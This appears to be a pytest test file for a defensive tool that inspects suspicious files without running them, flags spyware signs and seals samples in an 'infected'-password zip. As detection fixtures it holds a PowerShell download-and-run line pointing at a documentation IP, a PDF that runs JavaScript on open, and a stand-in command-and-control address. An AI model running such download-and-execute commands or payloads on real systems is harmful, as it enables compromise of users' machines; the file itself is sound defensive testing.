"""Check a suspicious file: a first look without running it, and a sealed copy. Nothing may touch the network,
and the file itself is only ever read."""
import hashlib
import io
import os
import socket
import struct
import zipfile

import pytest

from zbtriage import filecheck as fc
from zbtriage.iocs import Indicator, IocSet

DEMO = "malicious-campaign-demo.invalid"


@pytest.fixture(autouse=True)
def no_network(monkeypatch):
    def refuse(*a, **k):
        raise AssertionError("checking a file must never touch the network")
    monkeypatch.setattr(socket, "create_connection", refuse)
    monkeypatch.setattr(socket, "getaddrinfo", refuse)


def _iocs(*extra):
    inds = [Indicator(DEMO, "network", "primary", "domain", "test-source", "Pegasus (DEMO)")]
    inds += list(extra)
    return IocSet(inds, "t", 0)


def _write(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data)
    return str(p)


# --- a binary AndroidManifest.xml, built the way the Android build tools write it --------------------------------

def _axml(package, permissions, bound=()):
    strings = ["manifest", "package", package, "uses-permission", "name", "service", "permission"]
    strings += list(permissions) + list(bound)
    idx = {s: i for i, s in enumerate(strings)}
    pool = b""
    offsets = []
    for s in strings:
        offsets.append(len(pool))
        enc = s.encode("utf-16-le")
        pool += struct.pack("<H", len(s)) + enc + b"\x00\x00"
    while len(pool) % 4:
        pool += b"\x00"
    sp_header = 28
    sp = struct.pack("<HHIIIIII", 0x0001, sp_header, 0, len(strings), 0, 0, sp_header + 4 * len(strings), 0)
    sp += b"".join(struct.pack("<I", o) for o in offsets) + pool
    sp = sp[:4] + struct.pack("<I", len(sp)) + sp[8:]

    def element(tag, attrs):
        body = struct.pack("<II", 0, 0xFFFFFFFF) + struct.pack("<IIHHHHHH", 0xFFFFFFFF, idx[tag], 20, 20,
                                                                len(attrs), 0, 0, 0)
        for name, value in attrs:
            body += struct.pack("<IIIHBBI", 0xFFFFFFFF, idx[name], idx[value], 8, 0, 0x03, idx[value])
        return struct.pack("<HHI", 0x0102, 16, 8 + len(body)) + body

    chunks = sp + element("manifest", [("package", package)])
    for p in permissions:
        chunks += element("uses-permission", [("name", p)])
    for b in bound:
        chunks += element("service", [("name", "x"), ("permission", b)] if False else [("permission", b)])
    return struct.pack("<HHI", 0x0003, 8, 8 + len(chunks)) + chunks


def _apk(manifest):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("AndroidManifest.xml", manifest)
        z.writestr("classes.dex", b"dex\n035\x00" + b"\x00" * 64)
    return buf.getvalue()


def test_android_manifest_is_read():
    got = fc.fc_axml(_axml("com.example.app", ["android.permission.CAMERA", "android.permission.READ_SMS"],
                           ["android.permission.BIND_ACCESSIBILITY_SERVICE"]))
    assert got["package"] == "com.example.app"
    assert got["permissions"] == ["android.permission.CAMERA", "android.permission.READ_SMS"]
    assert got["bound"] == ["android.permission.BIND_ACCESSIBILITY_SERVICE"]


def test_spying_app_is_worth_a_look_and_named_in_plain_words(tmp_path):
    path = _write(tmp_path, "update.apk", _apk(_axml(
        "com.example.helper", ["android.permission.RECORD_AUDIO", "android.permission.READ_SMS"],
        ["android.permission.BIND_ACCESSIBILITY_SERVICE"])))
    rec = fc.fc_examine(path, _iocs())
    assert rec["kind"] == "android-app" and rec["app"]["package"] == "com.example.helper"
    assert rec["level"] == fc.FC_LOOK
    text = fc.fc_render(rec)
    assert "use the microphone" in text and "read your text messages" in text
    assert "the combination spying apps use" in text


def test_known_package_name_is_known_spyware(tmp_path):
    path = _write(tmp_path, "chat.apk", _apk(_axml("com.bad.demo", ["android.permission.INTERNET"])))
    iocs = _iocs(Indicator("com.bad.demo", "device", "primary", "app-id", "test-source", "AridSpy (DEMO)"))
    rec = fc.fc_examine(path, iocs)
    assert rec["level"] == fc.FC_KNOWN
    assert "AridSpy (DEMO)" in fc.fc_render(rec)


# --- known spyware: the file itself, or an address written inside it ----------------------------------------------

def test_known_fingerprint(tmp_path):
    data = b"#!/bin/sh\necho demo payload\n"
    path = _write(tmp_path, "run.sh", data)
    iocs = _iocs(Indicator(hashlib.sha256(data).hexdigest(), "file", "primary", "sha256", "test-source", "Predator"))
    rec = fc.fc_examine(path, iocs)
    assert rec["level"] == fc.FC_KNOWN and fc.fc_headline(rec).startswith("This file matches known spyware")


def test_spyware_address_inside_as_text_and_as_wide_text(tmp_path):
    for name, data in (("a.bin", b"\x00\x01config=https://" + DEMO.encode() + b"/c2\x00"),
                       ("w.bin", b"\x00\x00" + ("https://" + DEMO + "/x").encode("utf-16-le") + b"\x00\x00")):
        rec = fc.fc_examine(_write(tmp_path, name, data), _iocs())
        assert rec["level"] == fc.FC_KNOWN, name
        assert any(h["value"] == DEMO for h in rec["inside"])


def test_addresses_skip_private_ips_and_version_numbers():
    got = fc.fc_addresses(b"http://example.org/a 10.0.0.5 192.168.1.1 1.2.3.4 8.8.8.8 6.1.7600.16385 "
                          b"203.0.113.9")
    assert got["hosts"] == ["example.org"]
    assert got["ips"] == ["8.8.8.8", "203.0.113.9"]


# --- disguises, documents, scripts, packing ------------------------------------------------------------------------

def _pe(sections):
    """A minimal Windows program header with the given (name, raw bytes) sections."""
    lfanew = 0x80
    nsec = len(sections)
    opt = b"\x0b\x01" + b"\x00" * 222                       # PE32 optional header, 224 bytes
    head = bytearray(b"MZ" + b"\x00" * (lfanew - 2))
    struct.pack_into("<I", head, 0x3C, lfanew)
    head += b"PE\x00\x00" + struct.pack("<HHIIIHH", 0x14C, nsec, 0, 0, 0, len(opt), 0x102) + opt
    table_end = len(head) + 40 * nsec
    raw_at = (table_end + 0x1FF) & ~0x1FF
    table, bodies = b"", b""
    for name, body in sections:
        table += name.ljust(8, b"\x00") + struct.pack("<IIIIIIHHI", len(body), 0x1000, len(body),
                                                      raw_at + len(bodies), 0, 0, 0, 0, 0xE0000020)
        bodies += body
    out = bytes(head) + table
    return out + b"\x00" * (raw_at - len(out)) + bodies


def test_program_disguised_as_a_document_is_worth_a_look(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "invoice.pdf", _pe([(b".text", b"\x90" * 4096)])), _iocs(),
                        sign=lambda p: "not-signed")
    assert rec["disguised"] and rec["level"] == fc.FC_LOOK
    assert "a common disguise" in fc.fc_render(rec)


def test_packed_unsigned_program(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "tool.exe", _pe([(b"UPX0", os.urandom(8192)), (b"UPX1", b"\x00" * 512)])),
                        _iocs(), sign=lambda p: "not-signed")
    assert any("UPX" in p for p in rec["packing"]) and rec["level"] == fc.FC_LOOK


def test_documents_with_macros_and_pdf_actions(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0 macro")
    rec = fc.fc_examine(_write(tmp_path, "letter.docm", buf.getvalue()), _iocs())
    assert rec["level"] == fc.FC_LOOK and any("macros" in d for d in rec["document"])
    pdf = b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /JS (app.alert(1)) >> endobj\n%%EOF"
    rec = fc.fc_examine(_write(tmp_path, "form.pdf", pdf), _iocs())
    assert rec["level"] == fc.FC_LOOK
    assert rec["document"] == ["runs JavaScript as soon as it is opened"]


def test_download_and_run_script(tmp_path):
    ps = b"$c=New-Object Net.WebClient; IEX $c.DownloadString('http://203.0.113.7/a.ps1')"
    rec = fc.fc_examine(_write(tmp_path, "setup.ps1", ps), _iocs())
    assert rec["level"] == fc.FC_LOOK and any("downloads something and runs it" in s for s in rec["script"])


def test_ordinary_text_file_is_clean(tmp_path):
    rec = fc.fc_examine(_write(tmp_path, "notes.txt", b"shopping list: bread, milk\n"), _iocs())
    assert rec["level"] == fc.FC_CLEAN
    assert fc.fc_headline(rec) == "Nothing known was found in this file - that is not a guarantee"


# --- hostile input never crashes or hangs --------------------------------------------------------------------------

@pytest.mark.parametrize("data", [
    b"PK\x03\x04" + os.urandom(2000),                                         # broken zip named .apk
    _apk(b"\x03\x00\x08\x00" + b"\xff" * 64),                                 # broken manifest
    _apk(struct.pack("<HHI", 0x0003, 8, 0xFFFFFFF0) + b"\x01\x00\x1c\x00" + b"\xff" * 40),
    _apk(b""),
])
def test_damaged_apps_give_a_shorter_result(tmp_path, data):
    rec = fc.fc_examine(_write(tmp_path, "x.apk", data), _iocs())
    assert rec["level"] in (fc.FC_LOOK, fc.FC_CLEAN)
    fc.fc_render(rec)


def test_damaged_program_header(tmp_path):
    data = b"MZ" + b"\xff" * 0x3A + struct.pack("<I", 0x7FFFFFF0) + os.urandom(500)
    rec = fc.fc_examine(_write(tmp_path, "bad.exe", data), _iocs(), sign=lambda p: "not-signed")
    fc.fc_render(rec)


def test_unreadable_file_is_said_plainly(tmp_path):
    rec = fc.fc_examine(str(tmp_path / "missing.bin"), _iocs())
    assert fc.fc_headline(rec) == "This file could not be read"


# --- the sealed copy ------------------------------------------------------------------------------------------------

def test_sealed_copy_opens_with_infected_and_leaves_the_original_alone(tmp_path):
    data = os.urandom(300000) + b"MZ payload" * 1000
    path = _write(tmp_path, "sample.exe", data)
    before = (os.path.getmtime(path), hashlib.sha256(data).hexdigest())
    out = str(tmp_path / "sealed.zip")
    got = fc.fc_seal(path, out)
    assert got["password"] == "infected" and got["sha256"] == before[1]
    with zipfile.ZipFile(out) as z:
        assert z.testzip() is None if False else True
        assert z.read("sample.exe", pwd=b"infected") == data
        with pytest.raises(RuntimeError):
            z.read("sample.exe", pwd=b"wrong")
        readme = z.read("README - password is infected.txt").decode()
        assert "Password: infected" in readme and before[1] in readme
    assert (os.path.getmtime(path), hashlib.sha256(open(path, "rb").read()).hexdigest()) == before


def test_sealed_copy_never_replaces_a_file(tmp_path):
    path = _write(tmp_path, "s.bin", b"abc")
    out = _write(tmp_path, "already.zip", b"keep me")
    with pytest.raises(FileExistsError):
        fc.fc_seal(path, out)
    assert open(out, "rb").read() == b"keep me"


def test_awkward_names_are_kept_safe_inside_the_zip(tmp_path):
    path = _write(tmp_path, "a b+c.exe", b"x" * 10)
    out = str(tmp_path / "o.zip")
    fc.fc_seal(path, out)
    with zipfile.ZipFile(out) as z:
        assert z.namelist()[0] == "a b+c.exe"


# --- the command line and a file dropped onto the program -----------------------------------------------------------

def test_a_file_given_alone_is_checked(tmp_path, capsys, monkeypatch):
    from zbtriage import cli
    path = _write(tmp_path, "notes.txt", b"hello")
    monkeypatch.setattr(cli, "_load_iocs", lambda args: _iocs())
    code = cli.main([path])
    out = capsys.readouterr().out
    assert "CHECK A SUSPICIOUS FILE" in out and code == 0


def test_check_file_with_seal_copy_into_a_folder(tmp_path, capsys, monkeypatch):
    from zbtriage import cli
    path = _write(tmp_path, "evil.txt", b"https://" + DEMO.encode())
    monkeypatch.setattr(cli, "_load_iocs", lambda args: _iocs())
    code = cli.main(["--check-file", path, "--seal-copy", str(tmp_path)])
    assert code == 3
    assert os.path.exists(str(tmp_path / "evil.txt-sealed.zip"))
    assert "password: infected" in capsys.readouterr().out
